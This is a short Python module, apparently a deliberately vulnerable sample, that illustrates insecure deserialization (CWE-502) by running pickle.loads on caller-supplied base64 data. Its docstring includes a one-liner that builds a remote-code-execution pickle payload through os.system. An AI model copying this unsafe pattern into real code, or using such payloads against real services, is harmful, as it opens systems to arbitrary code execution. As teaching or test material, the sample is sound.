"""
Insecure Deserialization — CWE-502: Deserialization of Untrusted Data.

pickle.loads() is called on attacker-controlled base64-encoded data, enabling
arbitrary code execution via a crafted pickle payload.
"""
import base64
import pickle


def load_object(data: str) -> str:
    """Deserialise a base64-encoded pickle object and return its string representation.

    VULNERABLE: pickle.loads() on attacker-controlled input = remote code execution.

    Generate a safe test payload (serialised dict):
        python3 -c "import pickle,base64; print(base64.b64encode(pickle.dumps({'key':'value'})).decode())"

    Generate an RCE payload:
        python3 -c "
        import pickle, base64, os
        class X:
            def __reduce__(self): return (os.system, ('id > /tmp/pwned',))
        print(base64.b64encode(pickle.dumps(X())).decode())
        "

    Safe test payload value (serialised {'key': 'value'}):
        gASVEgAAAAAAAAB9lIwDa2V5lIwFdmFsdWWUcy4=
    """
    try:
        raw = base64.b64decode(data)
    except Exception as exc:
        return f"Base64 decode error: {exc}"
    try:
        obj = pickle.loads(raw)  # noqa: S301
        return f"Deserialised ({type(obj).__name__}): {obj!r}"
    except Exception as exc:
        return f"Deserialisation error: {exc}"
